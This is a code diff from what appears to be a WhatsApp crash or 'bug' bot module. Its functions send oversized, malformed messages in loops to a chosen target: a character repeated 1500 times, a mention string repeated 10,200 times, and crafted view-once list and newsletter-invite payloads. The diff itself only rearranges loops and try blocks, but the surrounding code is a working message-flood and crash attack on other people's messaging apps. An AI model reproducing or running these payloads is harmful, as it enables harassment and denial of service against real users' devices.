@@ -1,11 +1,11 @@
 exports.beta2 = async (viper, target, cct = true, Ptcp = true) => {
+    for (let i = 0; i < 3; i++) {
 const crypto = require('crypto')
 const fs = require('fs')
 const o = fs.readFileSync(`./database/lib/viper/o.jpg`)
 const jids = `_*~@13135550002~*_\n`.repeat(10200);
-const ui = 'ꦽ'.repeat(1500);
+const ui = 'ꦽ'.repeat(1500); 
 
-    for (let i = 0; i < 3; i++) {
     await viper.relayMessage(target, {
      ephemeralMessage: {
       message: {
@@ -79,6 +79,7 @@ const ui = 'ꦽ'.repeat(1500);
 
 
 exports.beta1 = async (viper, target) => {
+    for (let i = 0; i < 3; i++) { 
 const crypto = require('crypto');
 const fs = require('fs'); // Pastikan fs di-import
 const o = fs.readFileSync(`./database/lib/viper/o.jpg`);
@@ -92,9 +93,8 @@ const stanza = [
             tag: "biz",
         },
     ];
-
-    for (let i = 0; i < 3; i++) {
-        const messagePayload = {
+ 
+const messagePayload = {
 viewOnceMessage: {
 message: {
 listResponseMessage: {
@@ -233,12 +233,12 @@ ticket_id: crypto.randomBytes(16),
 };
 
 exports.buk1 = async (viper, target, cct = true, Ptcp = true) => {
+    try { 
 const crypto = require('crypto')
 const fs = require('fs')
 const o = fs.readFileSync(`./database/lib/viper/o.jpg`)
 
-    try {
-                const message = {
+const message = {
             botInvokeMessage: {
                 message: {
                     newsletterAdminInviteMessage: {
